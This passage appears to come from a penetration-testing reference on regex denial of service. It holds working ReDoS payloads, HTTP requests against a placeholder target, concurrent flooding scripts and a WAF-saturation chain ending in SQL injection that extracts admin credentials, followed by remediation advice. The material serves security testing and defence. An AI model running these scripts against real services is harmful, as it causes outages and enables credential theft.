aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

# For email validation:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!@x.com

# For URL validation:
http://a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```
::

::collapsible
---
label: "Java Specific"
---

```java [Java — Pattern.matches ReDoS]
import java.util.regex.Pattern;

// Vulnerable pattern
String regex = "^([a-zA-Z]+)*$";
String evil = "a".repeat(30) + "!";

// This will hang
Pattern.matches(regex, evil);
```

```text [Java-Specific Payload]
# Java regex engine is particularly vulnerable because:
# - No built-in timeout mechanism
# - Thread hangs indefinitely
# - Can cause thread pool exhaustion in web servers

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```text [Java XML Parser ReDoS]
# Many Java XML parsers use regex for validation
# DTD entity name: ^[a-zA-Z_:][a-zA-Z0-9._:-]*$
# This pattern has adjacent overlapping quantifiers

a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```
::

::collapsible
---
label: "PHP Specific"
---

```php [PHP — preg_match ReDoS]
<?php
// Vulnerable pattern
$pattern = '/^([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/';
$evil = str_repeat('a.', 15) . '!';

// PHP has a backtrack limit (pcre.backtrack_limit = 1000000)
// But this still causes significant CPU usage before failing
preg_match($pattern, $evil);

// Check if backtrack limit was hit:
if (preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR) {
    echo "Backtrack limit reached!";
}
?>
```

```text [PHP-Specific Notes]
# PHP PCRE has pcre.backtrack_limit (default: 1,000,000)
# This LIMITS but doesn't prevent ReDoS:
# - Processing 1,000,000 backtracks still takes significant CPU
# - preg_last_error() returns PREG_BACKTRACK_LIMIT_ERROR
# - Application may handle this error incorrectly (fail open)
# - Multiple concurrent requests multiply the impact
```

```text [PHP Payload — Reach Backtrack Limit]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```
::

::collapsible
---
label: ".NET / C# Specific"
---

```csharp [.NET — Regex with Timeout]
using System.Text.RegularExpressions;

// .NET supports Regex timeout (since .NET 4.5)
var regex = new Regex(@"^([a-zA-Z]+)*$", RegexOptions.None, TimeSpan.FromSeconds(2));

try {
    regex.IsMatch(evil_input);
} catch (RegexMatchTimeoutException) {
    // Timeout hit — but CPU was at 100% for 2 seconds
}
```

```text [.NET-Specific Notes]
# .NET regex engine is NFA-based and vulnerable
# .NET 4.5+ supports timeout parameter in Regex constructor
# Without timeout, regex can hang indefinitely
# With timeout, still causes CPU spike for the timeout duration
# ASP.NET thread pool exhaustion is possible with many concurrent requests
```

```text [.NET Payload]
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
```
::

---

## Exploitation Techniques

### Web Application ReDoS

::collapsible
---
label: "HTTP Request-Based ReDoS Attacks"
---

```http [Form Input — Email Field]
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=aaaaaaaaaaaaaaaaaaaaaaaaaaa!@example.com&password=test123
```

```http [Form Input — Username Field]
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!&password=test123
```

```http [URL Parameter — Search]
GET /search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa! HTTP/1.1
Host: target.com
```

```http [URL Parameter — Filter]
GET /api/products?category=a.a.a.a.a.a.a.a.a.a.a.a.a.a! HTTP/1.1
Host: target.com
```

```http [JSON Body — API Input]
POST /api/validate HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "aaaaaaaaaaaaaaaaaaaaaaaaaaa!@x.com",
  "url": "http://a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!",
  "phone": "111111111111111111111111111!"
}
```

```http [User-Agent Header ReDoS]
GET / HTTP/1.1
Host: target.com
User-Agent: aaaaaaaaaaaaaaaaaaaaaaaaaaa/aaaaaaaaaaaaaaaaaaaaaaaaaaa!
```

```http [Referer Header ReDoS]
GET / HTTP/1.1
Host: target.com
Referer: http://a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
```

```http [Content-Type Header ReDoS]
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/aaaaaaaaaaaaaaaaaaaaaaaaaaaa!

data=test
```

```http [Cookie Value ReDoS]
GET / HTTP/1.1
Host: target.com
Cookie: session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!; preference=a.a.a.a.a.a.a.a.a.a.a.a.a!
```

```http [Accept-Language Header ReDoS]
GET / HTTP/1.1
Host: target.com
Accept-Language: aa-aa,aa-aa,aa-aa,aa-aa,aa-aa,aa-aa,aa-aa,aa-aa,aa-aa,aa-aa!
```

```http [File Upload — Filename ReDoS]
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----boundary

------boundary
Content-Disposition: form-data; name="file"; filename="a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!"
Content-Type: application/octet-stream

file content here
------boundary--
```

```http [GraphQL Query ReDoS]
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "query": "{ search(query: \"aaaaaaaaaaaaaaaaaaaaaaaaaaa!\") { results } }"
}
```

```http [Path-Based ReDoS]
GET /api/resource/a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a! HTTP/1.1
Host: target.com
```
::

### Distributed ReDoS (Amplified DoS)

::collapsible
---
label: "Multi-Request ReDoS Amplification"
---

```python [Python — Concurrent ReDoS Attack]
import asyncio
import aiohttp
import time

TARGET = "http://target.com/search"
PAYLOAD = "a" * 25 + "!"
CONCURRENT = 50  # Number of simultaneous requests

async def send_redos(session, i):
    params = {"q": PAYLOAD}
    try:
        async with session.get(TARGET, params=params, timeout=aiohttp.ClientTimeout(total=120)) as resp:
            elapsed = resp.headers.get('X-Response-Time', 'N/A')
            print(f"[{i}] Status: {resp.status}, Time: {elapsed}")
    except asyncio.TimeoutError:
        print(f"[{i}] TIMEOUT — Server thread frozen!")
    except Exception as e:
        print(f"[{i}] Error: {e}")

async def main():
    print(f"[*] Sending {CONCURRENT} concurrent ReDoS requests...")
    print(f"[*] Target: {TARGET}")
    print(f"[*] Payload length: {len(PAYLOAD)}")
    
    async with aiohttp.ClientSession() as session:
        tasks = [send_redos(session, i) for i in range(CONCURRENT)]
        await asyncio.gather(*tasks)
    
    print("[*] Attack complete. Check if target is responsive.")

asyncio.run(main())
```

```python [Python — Thread Pool Exhaustion Attack]
import threading
import requests
import time

TARGET = "http://target.com/api/validate"
PAYLOAD = {
    "email": "a" * 30 + "!@x.com",
    "url": "http://" + "a." * 20 + "!",
    "username": "a_" * 15 + "!"
}

def send_request(i):
    try:
        start = time.time()
        resp = requests.post(TARGET, json=PAYLOAD, timeout=300)
        elapsed = time.time() - start
        print(f"Thread {i}: {resp.status_code} in {elapsed:.1f}s")
    except Exception as e:
        print(f"Thread {i}: {e}")

# Exhaust all server worker threads
print("[*] Launching thread pool exhaustion attack...")
threads = []
for i in range(100):
    t = threading.Thread(target=send_request, args=(i,))
    threads.append(t)
    t.start()
    time.sleep(0.05)  # Small delay to avoid connection limits

for t in threads:
    t.join()

print("[*] All threads completed.")
```

```bash [cURL — Parallel ReDoS]
# Using GNU Parallel
seq 1 100 | parallel -j50 "curl -s -o /dev/null -w '%{http_code} %{time_total}s\n' \
  'http://target.com/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaa!'"
```
::

### npm Package / Dependency ReDoS

::collapsible
---
label: "Known Vulnerable npm Packages"
---

Many widely-used npm packages have had ReDoS vulnerabilities:

| Package | Vulnerable Version | CVE | Vulnerable Pattern |
|---------|-------------------|-----|-------------------|
| `ua-parser-js` | < 0.7.24 | CVE-2021-27292 | User-Agent parsing regex |
| `color-string` | < 1.5.5 | CVE-2021-29060 | Color string parsing |
| `glob-parent` | < 5.1.2 | CVE-2020-28469 | Glob pattern parsing |
| `trim-newlines` | < 3.0.1 | CVE-2021-33623 | Newline trimming |
| `normalize-url` | < 4.5.1 | CVE-2021-33502 | URL normalization |
| `is-svg` | < 4.3.0 | CVE-2021-28092 | SVG detection regex |
| `browserslist` | < 4.16.5 | CVE-2021-23364 | Browser query parsing |
| `highlight.js` | < 10.4.1 | CVE-2020-26237 | Syntax highlighting |
| `postcss` | < 8.2.13 | CVE-2021-23382 | CSS parsing |
| `validator` | Various | Multiple | Email/URL validation |
| `marked` | < 4.0.10 | CVE-2022-21680 | Markdown parsing |
| `semver` | < 7.5.2 | CVE-2022-25883 | Version parsing |

```bash [Audit npm Dependencies]
# Check for known vulnerable dependencies
npm audit

# Specifically check for ReDoS
npm audit --audit-level=moderate | grep -i "redos\|regex\|backtrack\|denial"

# Use snyk for deeper analysis
snyk test
```

```text [Attack via Dependency]
# If the application uses ua-parser-js for User-Agent parsing:
User-Agent: a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]

# If the application uses is-svg:
Content-Type: image/svg+xml
Body: <svg a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]a]
```
::

---

## Privilege Escalation via ReDoS

::note
ReDoS is primarily a **Denial of Service** attack, but it can be leveraged for privilege escalation in several indirect ways. The denial of service itself can create conditions that enable further exploitation.
::

::card-group
  ::card
  ---
  title: "WAF Bypass → Direct Exploitation"
  icon: i-lucide-shield-off
  ---
  ReDoS against WAF regex rules causes the WAF to **time out and fail open**. While the WAF is processing the ReDoS payload, subsequent requests bypass WAF inspection entirely, allowing SQLi, XSS, RCE, and other attacks to pass through.
  ::

  ::card
  ---
  title: "Race Condition Window"
  icon: i-lucide-timer
  ---
  ReDoS freezes server threads, creating **timing windows** for race condition attacks. While the server is busy processing ReDoS, concurrent requests may bypass checks that would normally prevent race conditions.
  ::

  ::card
  ---
  title: "Thread Pool Exhaustion → Default Credentials"
  icon: i-lucide-key
  ---
  Exhausting all server worker threads causes the application to become unresponsive. Administrators may **restart services**, **disable security features**, or **enable debug mode** to troubleshoot — creating new attack surfaces.
  ::

  ::card
  ---
  title: "Monitoring Blind Spot"
  icon: i-lucide-eye-off
  ---
  ReDoS-caused CPU spikes overwhelm monitoring systems and generate alert noise. Security teams focus on the DoS while the attacker performs **lateral movement, data exfiltration, or privilege escalation** elsewhere in the infrastructure.
  ::

  ::card
  ---
  title: "Crash → Insecure Recovery"
  icon: i-lucide-alert-triangle
  ---
  Application crashes from ReDoS may trigger **insecure recovery modes**, reset sessions, bypass lockout counters, or expose debug endpoints that reveal sensitive information.
  ::

  ::card
  ---
  title: "Resource Starvation → Fail Open"
  icon: i-lucide-cpu
  ---
  CPU exhaustion may cause **security middleware** (authentication, authorization, rate limiting) to fail open. When the security layer can't process in time, requests may pass through without proper checks.
  ::
::

### WAF Bypass Chain

::steps{level="4"}

#### Identify WAF-Protected Endpoint

```http
GET /api/users?id=1' OR 1=1-- HTTP/1.1
Host: target.com

# Response: 403 Forbidden (WAF blocked SQLi)
```

#### Send ReDoS Payload to Saturate WAF

```python
import threading
import requests

def redos_waf():
    payload = "a" * 50 + "!" + "' OR 1=1--"
    requests.get(f"http://target.com/search?q={payload}", timeout=300)

# Send 50 concurrent ReDoS requests to overload WAF
for _ in range(50):
    threading.Thread(target=redos_waf).start()
```

#### Send Actual Attack While WAF is Busy

```http
GET /api/users?id=1' UNION SELECT username,password FROM admin_users-- HTTP/1.1
Host: target.com

# WAF threads are frozen processing ReDoS
# This request passes through uninspected
# Response: 200 OK with admin credentials
```

#### Escalate with Extracted Credentials

Use the extracted admin credentials to authenticate and access admin functionality.

::

---

## Methodology

::tip
ReDoS testing requires a **systematic approach** that combines static analysis, black-box timing measurement, and targeted payload crafting. The methodology below covers both white-box (source code access) and black-box (no source code) scenarios.
::

::accordion
  :::accordion-item
  ---
  icon: i-lucide-search
  label: "Phase 1 — Reconnaissance & Input Mapping"
  ---

  Map every input vector that may be processed by a regex engine. Regex is used far more widely than most testers realize.

  **Input Vectors to Map:**

  ::field-group
    ::field{name="Form Fields" type="high-priority"}
    Email, username, password, phone number, URL, domain, IP address, postal code, credit card, date, time — any field with format validation.
    ::

    ::field{name="URL Parameters" type="high-priority"}
    Search queries, filter values, sort parameters, routing paths — any parameter that may trigger pattern matching.
    ::

    ::field{name="HTTP Headers" type="medium-priority"}
    `User-Agent`, `Referer`, `Accept-Language`, `Content-Type`, `Cookie` — headers parsed by the application, middleware, or WAF.
    ::

    ::field{name="File Uploads" type="medium-priority"}
    Filenames, MIME types, file content parsed by regex (CSV, XML, HTML, Markdown, config files).
    ::

    ::field{name="API Bodies" type="high-priority"}
    JSON/XML field values that undergo validation, especially email, URL, phone, and custom format fields.
    ::

    ::field{name="GraphQL" type="medium-priority"}
    Query arguments, variable values — any input that enters server-side validation.
    ::

    ::field{name="WebSocket Messages" type="low-priority"}
    Message content parsed or validated with regex on the server.
    ::
  ::

  :::

  :::accordion-item
  ---
  icon: i-lucide-code
  label: "Phase 2 — Regex Pattern Discovery"
  ---

  Determine what regex patterns the application uses. This differs between white-box and black-box testing.

  **White-Box (Source Code Access):**

  ```bash
  # Search for regex patterns
  grep -rn "re\.compile\|Pattern\.compile\|new RegExp\|preg_match\|/.*/" \
    --include="*.py" --include="*.js" --include="*.java" --include="*.php" \
    --include="*.rb" --include="*.cs" .
  ```

  ```bash
  # Search for vulnerable patterns specifically
  grep -rPn "\([^)]*[+*][^)]*\)[+*]" --include="*.py" --include="*.js" .
  ```

  **Black-Box (No Source Code):**

  | Method | How It Reveals Patterns |
  |--------|----------------------|
  | Error messages | Verbose errors may display the regex pattern |
  | API documentation | OpenAPI/Swagger `pattern` fields |
  | JavaScript source | Client-side validation regex visible in source |
  | Response behavior | Input rejection messages hint at pattern structure |
  | Timing analysis | Response time changes reveal backtracking |
  | WAF rules | ModSecurity rule IDs in block responses |

  **Extract regex from JavaScript:**

  ```javascript
  // In browser console, find all regex literals:
  document.querySelectorAll('script').forEach(s => {
      const matches = s.textContent.match(/\/[^\/\n]+\/[gims]*/g);
      if (matches) console.log(matches);
  });
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-flask-conical
  label: "Phase 3 — Vulnerability Analysis"
  ---

  Analyze discovered patterns for ReDoS vulnerability.

  **Manual Analysis Checklist:**

  - [ ] Does the pattern contain **nested quantifiers**? `(x+)+`, `(x*)*`, `(x+)*`
  - [ ] Does the pattern contain **overlapping alternation**? `(a|a)`, `(\w|\d)`, `(ab|abc)`
  - [ ] Does the pattern contain **adjacent overlapping quantifiers**? `\w+\w+`, `\d+\d+`, `.+.+`
  - [ ] Does the pattern use **backtracking-prone features**? Backreferences `\1`, lookaheads `(?=...)`, lookbehinds `(?<=...)`
  - [ ] Is the pattern applied to **untrusted input** without length limits?
  - [ ] Is there a **regex timeout** configured?

  **Automated Analysis:**

  ```bash
  # Use recheck
  recheck "^([a-zA-Z0-9._-]+)*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$"
  
  # Use safe-regex
  node -e "console.log(require('safe-regex')('(a+)+'))"
  
  # Use regexploit
  regexploit scan app.py
  ```

  **Risk Classification:**

  | Complexity | Pattern Example | Input Length for Impact | Severity |
  |-----------|----------------|----------------------|----------|
  | O(2^n) — Exponential | `(a+)+$` | 20-30 chars | **Critical** |
  | O(n^k) — High Polynomial | `a+a+a+a+$` | 100-1000 chars | **High** |
  | O(n²) — Quadratic | `a+a+$` | 10,000+ chars | **Medium** |
  | O(n) — Linear | `a+$` | Not vulnerable | **None** |

  :::

  :::accordion-item
  ---
  icon: i-lucide-syringe
  label: "Phase 4 — Payload Crafting"
  ---

  Craft ReDoS payloads specific to each discovered vulnerable pattern.

  **Payload Crafting Rules:**

  1. **Match the character class**: If pattern uses `\d+`, payload must use digits. If `[a-z]+`, use lowercase letters.
  2. **Maximize ambiguity**: Use characters that match the overlapping part of the pattern.
  3. **End with a failing character**: The last character must NOT match the pattern's expected end, forcing complete backtracking.
  4. **Start short, increase gradually**: Begin with 15 chars and increase by 5 until CPU impact is observed.

  **Payload Generator:**

  ```python
  def craft_redos_payload(pattern_type, base_char, suffix, min_len=15, max_len=35, step=5):
      """Generate ReDoS payloads for a given pattern type."""
      payloads = []
      for length in range(min_len, max_len + 1, step):
          if pattern_type == "nested":
              # For (a+)+$ patterns
              payload = base_char * length + suffix
          elif pattern_type == "alternation":
              # For (a|ab)+$ patterns
              payload = base_char * length + suffix
          elif pattern_type == "adjacent":
              # For a+a+$ patterns (need longer input)
              payload = base_char * (length * 100) + suffix
          elif pattern_type == "dotted":
              # For (a.)+$ or (\w+\.)+$ patterns
              payload = (base_char + ".") * length + suffix
          elif pattern_type == "separated":
              # For (a[-._]a)+$ patterns
              payload = (base_char + "_") * length + suffix
          payloads.append(payload)
      return payloads
  
  # Generate payloads for email validation regex
  email_payloads = craft_redos_payload("nested", "a", "!@x.com")
  url_payloads = craft_redos_payload("dotted", "a", "!")
  username_payloads = craft_redos_payload("separated", "a", "!")
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-timer
  label: "Phase 5 — Timing Measurement"
  ---

  Measure response times to confirm ReDoS vulnerability and determine impact severity.

  **Baseline Measurement:**

  ```python
  import requests
  import time
  
  TARGET = "http://target.com/search"
  
  # Normal input — establish baseline
  start = time.time()
  requests.get(f"{TARGET}?q=normalquery")
  baseline = time.time() - start
  print(f"Baseline: {baseline:.3f}s")
  
  # ReDoS payloads — increasing length
  for length in [10, 15, 20, 25, 30]:
      payload = "a" * length + "!"
      start = time.time()
      try:
          requests.get(f"{TARGET}?q={payload}", timeout=30)
      except requests.Timeout:
          elapsed = 30
      else:
          elapsed = time.time() - start
      
      ratio = elapsed / baseline if baseline > 0 else 0
      print(f"Length {length}: {elapsed:.3f}s (ratio: {ratio:.1f}x baseline)")
  ```

  **Confirmation Criteria:**

  | Response Pattern | Conclusion |
  |-----------------|-----------|
  | Time increases **linearly** with input length | Not ReDoS (normal processing) |
  | Time increases **exponentially** (doubles per character) | **Exponential ReDoS confirmed** |
  | Time increases **polynomially** (quadratic/cubic) | **Polynomial ReDoS confirmed** |
  | Time is constant regardless of length | Pattern is not vulnerable |
  | Request times out | **Severe ReDoS** |

  :::

  :::accordion-item
  ---
  icon: i-lucide-bomb
  label: "Phase 6 — Impact Demonstration"
  ---

  Demonstrate the real-world impact of the ReDoS vulnerability.

  **Single-Thread Impact:**
  - Show that one request can freeze a server thread for X seconds/minutes
  - Calculate CPU cost per request

  **Multi-Thread Amplification:**
  - Demonstrate thread pool exhaustion with concurrent requests
  - Show that N concurrent ReDoS requests = complete server unavailability

  **Node.js Specific — Event Loop Freeze:**
  - A single ReDoS request freezes the entire Node.js event loop
  - ALL users are affected, not just the attacker's connection

  **Impact Metrics:**

  | Metric | How to Measure |
  |--------|---------------|
  | CPU time per request | Time a single ReDoS request |
  | Threads to exhaust pool | Send increasing concurrent requests until service is unreachable |
  | Recovery time | How long after attack stops until service resumes |
  | Collateral damage | Are other services on the same host affected? |
  | Cost impact | Cloud compute costs from CPU spikes |

  ```python
  # Impact demonstration — service availability check
  import requests
  import threading
  import time
  
  TARGET = "http://target.com"
  PAYLOAD = "a" * 25 + "!"
  
  # Monitor service availability during attack
  def monitor():
      while True:
          try:
              start = time.time()
              resp = requests.get(f"{TARGET}/health", timeout=5)
              elapsed = time.time() - start
              status = "UP" if resp.status_code == 200 else "ERROR"
              print(f"[MONITOR] {status} - {elapsed:.2f}s")
          except:
              print("[MONITOR] DOWN - Service unreachable!")
          time.sleep(1)
  
  # Start monitor
  threading.Thread(target=monitor, daemon=True).start()
  
  # Send ReDoS attacks
  print("[*] Starting ReDoS attack...")
  for i in range(20):
      threading.Thread(target=lambda: requests.get(
          f"{TARGET}/search?q={PAYLOAD}", timeout=300
      )).start()
      time.sleep(0.1)
  
  time.sleep(60)  # Monitor for 60 seconds
  ```

  :::

  :::accordion-item
  ---
  icon: i-lucide-file-text
  label: "Phase 7 — Documentation & Reporting"
  ---

  Document findings with clear evidence.

  **Report Structure:**

  1. **Vulnerable Pattern** — The exact regex pattern
  2. **Location** — File, line number, endpoint, or parameter
  3. **Payload** — The exact evil input string
  4. **Timing Evidence** — Table/graph showing exponential time growth
  5. **Impact Assessment** — Thread exhaustion, service availability, cost
  6. **Reproduction Steps** — curl commands or script to reproduce
  7. **Remediation** — Specific fix for this pattern

  **Evidence Format:**

  ```text
  ## ReDoS Vulnerability Report
  
  **Pattern:** `^([a-zA-Z0-9._-]+)*@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`
  **Location:** /api/register endpoint, email validation
  **Severity:** High
  
  **Timing Evidence:**
  | Input Length | Response Time | Ratio |
  |-------------|--------------|-------|
  | 15 chars    | 0.03s        | 1x    |
  | 20 chars    | 1.02s        | 34x   |
  | 25 chars    | 32.5s        | 1083x |
  | 30 chars    | >60s timeout | -     |
  
  **Payload:** `aaaaaaaaaaaaaaaaaaaaaaaaaaa!@x.com`
  
  **Impact:** A single request with a 30-character email can freeze
  a server thread for over 60 seconds. 20 concurrent requests
  exhaust the thread pool, causing complete service unavailability.
  ```

  :::
::

---

## Remediation & Defense

::card-group
  ::card
  ---
  title: Fix Vulnerable Patterns
  icon: i-lucide-wrench
  ---
  Rewrite vulnerable regex patterns to eliminate ambiguity.

  | Vulnerable | Fixed | Change |
  |-----------|-------|--------|
  | `(a+)+$` | `a+$` | Remove nesting |
  | `(a\|a)+$` | `a+$` | Remove overlapping alternation |
  | `\w+\w+$` | `\w{2,}$` | Merge adjacent quantifiers |
  | `([a-z]+\.)+` | `([a-z]+\.){1,10}` | Limit repetitions |
  | `(.+)*$` | `.*$` | Simplify nested quantifiers |
  ::

  ::card
  ---
  title: Set Regex Timeouts
  icon: i-lucide-clock
  ---
  Configure regex execution timeouts in your language/framework.

  ```csharp
  // .NET
  var regex = new Regex(pattern, RegexOptions.None, TimeSpan.FromSeconds(1));
  ```

  ```java
  // Java — Use Guava or custom timeout wrapper
  ExecutorService executor = Executors.newSingleThreadExecutor();
  Future<Boolean> future = executor.submit(() -> pattern.matcher(input).matches());
  future.get(1, TimeUnit.SECONDS);
  ```

  ```python
  # Python — Use signal-based timeout
  import signal
  signal.alarm(1)  # 1 second timeout
  ```
  ::

  ::card
  ---
  title: Input Length Limits
  icon: i-lucide-ruler
  ---
  Enforce **strict maximum length** on all inputs before regex processing. Most legitimate inputs are short — emails < 254 chars, usernames < 50 chars, URLs < 2048 chars.

  ```python
  MAX_EMAIL_LENGTH = 254
  
  def validate_email(email):
      if len(email) > MAX_EMAIL_LENGTH:
          return False
      return email_pattern.match(email)
  ```
  ::

  ::card
  ---
  title: Use Atomic Groups / Possessive Quantifiers
  icon: i-lucide-lock
  ---
  Atomic groups `(?>...)` and possessive quantifiers `a++` prevent backtracking by making the match permanent once succeeded.

  ```text
  # Vulnerable
  (a+)+$
  
  # Fixed with atomic group
  (?>a+)+$
  
  # Fixed with possessive quantifier (Java, PCRE)
  (a++)$
  ```

  Note: Not all regex engines support these features.
  ::

  ::card
  ---
  title: Use RE2 / DFA Engine
  icon: i-lucide-shield-check
  ---
  Replace NFA-based regex engines with **RE2** (Google) or other DFA-based engines that guarantee linear-time matching.

  ```python
  # Python — Use google-re2 instead of re
  import re2
  pattern = re2.compile(r"(a+)+$")
  # RE2 automatically rejects patterns it can't process in linear time
  ```

  ```javascript
  // Node.js — Use re2 npm package
  const RE2 = require('re2');
  const pattern = new RE2('(a+)+$');
  ```

  ```go
  // Go — Default regexp package is already RE2-based
  import "regexp"
  pattern := regexp.MustCompile(`(a+)+$`)  // Safe by default
  ```
  ::

  ::card
  ---
  title: Static Analysis in CI/CD
  icon: i-lucide-git-branch
  ---
  Integrate ReDoS detection tools into your CI/CD pipeline.

  ```yaml
  # GitHub Actions — ReDoS check
  - name: Check for ReDoS
    run: |
      npm install -g recheck
      find . -name "*.js" -exec grep -l "RegExp\|/.*/" {} \; | \
      while read file; do
        recheck scan "$file"
      done
  ```

  ```bash
  # Pre-commit hook
  #!/bin/bash
  files=$(git diff --cached --name-only --diff-filter=ACM | grep -E '\.(js|py|java|php)$')
  for file in $files; do
    regexploit scan "$file"
    if [ $? -ne 0 ]; then
      echo "ReDoS vulnerability detected in $file"
      exit 1
    fi
  done
  ```
  ::

  ::card
  ---
  title: Run Regex in Separate Thread/Process
  icon: i-lucide-cpu
  ---
  Execute regex matching in a **sandboxed thread or worker process** with a hard timeout. If the regex hangs, kill the worker without affecting the main application.

  ```javascript
  // Node.js — Worker thread for regex
  const { Worker, isMainThread, parentPort } = require('worker_threads');
  
  if (isMainThread) {
    function safeRegexTest(pattern, input, timeout = 1000) {
      return new Promise((resolve, reject) => {
        const worker = new Worker(__filename, {
          workerData: { pattern, input }
        });
        const timer = setTimeout(() => {
          worker.terminate();
          reject(new Error('Regex timeout'));
        }, timeout);
        worker.on('message', (result) => {
          clearTimeout(timer);
          resolve(result);
        });
      });
    }
  } else {
    const { pattern, input } = require('worker_threads').workerData;
    const result = new RegExp(pattern).test(input);
    parentPort.postMessage(result);
  }
  ```
  ::

  ::card
  ---
  title: Avoid Regex When Possible
  icon: i-lucide-ban
  ---
  For common validations, use purpose-built validators instead of regex.

  ```python
  # Instead of regex for email validation:
  from email_validator import validate_email
  
  # Instead of regex for URL validation:
  from urllib.parse import urlparse
  parsed = urlparse(url)
  
  # Instead of regex for IP validation:
  import ipaddress
  ipaddress.ip_address(user_input)
  
  # Instead of regex for date validation:
  from datetime import datetime
  datetime.strptime(date_str, "%Y-%m-%d")
  ```
  ::

  ::card
  ---
  title: WAF/Middleware Hardening
  icon: i-lucide-brick-wall
  ---
  - Audit all WAF regex rules for ReDoS vulnerability
  - Set processing time limits on WAF rule evaluation
  - Configure WAF to **fail closed** (block traffic) when regex processing times out, not fail open
  - Use WAF products that use RE2/DFA engines internally
  ::
::

---

## Common Vulnerable Regex Patterns — Quick Reference

::collapsible
---
label: "Comprehensive Vulnerable Pattern Table"
---

| Category | Vulnerable Pattern | Safe Alternative | Evil Input |
|----------|-------------------|-----------------|------------|
| **Email** | `^([a-zA-Z0-9._-]+)*@` | `^[a-zA-Z0-9._%+-]+@` | `aaa...aaa!` |
| **Email** | `^([\w.-]+)+@` | `^[\w.+-]{1,64}@` | `aaa...aaa!` |
| **URL** | `^(https?://)?([a-z0-9.-]+\.)+` | Use `urlparse()` | `http://a.a.a...a!` |
| **URL** | `([\/\w \.-]*)*\/?$` | `[\/\w.-]*\/?$` | `/a/a/a...a!` |
| **IPv4** | `^(\d{1,3}\.){3}\d{1,3}$` | Use `ipaddress` module | `1.1.1...1!` |
| **Username** | `^([a-zA-Z0-9]+([._-][a-zA-Z0-9]+)*)+$` | `^[a-zA-Z0-9._-]{1,50}$` | `a.a.a...a!` |
| **Password** | `^([a-zA-Z0-9@#$%]+)*$` | `^[a-zA-Z0-9@#$%]{8,128}$` | `aaa...aaa!` |
| **Phone** | `^(\+?\d{1,3}[-.]?)*\d+$` | `^\+?\d{1,15}$` | `1-1-1...1!` |
| **HTML** | `<([a-z]+)([^<]+)*>` | Use HTML parser | `<a aaa...aaa!` |
| **File Path** | `^(\/[a-z._-]+)+$` | `^[\/a-z._-]{1,500}$` | `/a/a/a...a!` |
| **Date** | `^(\d{1,2}[/-]){2}\d{2,4}$` | Use date parser | `1/1/1...1!` |
| **CSS Color** | `^#?([a-fA-F0-9]{6}\|[a-fA-F0-9]{3})$` | `^#?[a-fA-F0-9]{3,6}$` | `aaaaaa...a!` |
| **Domain** | `^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$` | `^[a-zA-Z0-9.-]{1,253}$` | `a.a.a...a!` |
| **Credit Card** | `^(\d{4}[-\s]?){3}\d{4}$` | `^\d{13,19}$` | `1111-1111...!` |
| **JSON** | `("(\\.|[^"\\])*")+` | Use JSON parser | `"aaa\"aaa\"...!` |
| **Markdown** | `(\*{1,2}[^*]+\*{1,2})+` | Use Markdown parser | `*a*a*a*...!` |
| **Log Line** | `^(.+\s)+.+$` | `^.{1,1000}$` | `a a a a...!` |
| **Comment** | `(\/\*.*?\*\/)+` | Use code parser | `/*a*//*a*/...!` |
::

---

## Tools

::card-group
  ::card
  ---
  title: recheck
  icon: i-lucide-shield-check
  to: https://makenowjust-labs.github.io/recheck/
  target: _blank
  ---
  Comprehensive regex vulnerability checker. Analyzes patterns for exponential and polynomial ReDoS, generates attack strings, and provides fix suggestions.
  ::

  ::card
  ---
  title: regexploit
  icon: i-lucide-search-code
  to: https://github.com/doyensec/regexploit
  target: _blank
  ---
  Static analysis tool that extracts regex patterns from source code and tests them for ReDoS vulnerability. Supports Python, JavaScript, and other languages.
  ::

  ::card
  ---
  title: safe-regex
  icon: i-lucide-shield
  to: https://github.com/substack/safe-regex
  target: _blank
  ---
  JavaScript library that detects potentially vulnerable regex patterns using star height analysis. Useful for runtime checking in Node.js applications.
  ::

  ::card
  ---
  title: rxxr2
  icon: i-lucide-cpu
  to: https://github.com/superhuman/rxxr2
  target: _blank
  ---
  Academic-grade ReDoS static analyzer. Highly accurate detection of exponential and polynomial backtracking vulnerabilities.
  ::

  ::card
  ---
  title: RE2
  icon: i-lucide-zap
  to: https://github.com/google/re2
  target: _blank
  ---
  Google's DFA-based regex engine that guarantees linear-time matching. Available for C++, Python (`google-re2`), Node.js (`re2`), and other languages.
  ::

  ::card
  ---
  title: Regex101
  icon: i-lucide-test-tube
  to: https://regex101.com/
  target: _blank
  ---
  Online regex tester with step-by-step debugging. Use the debugger to visualize backtracking behavior and confirm ReDoS vulnerability.
  ::

  ::card
  ---
  title: Burp Suite
  icon: i-lucide-bug
  to: https://portswigger.net/burp
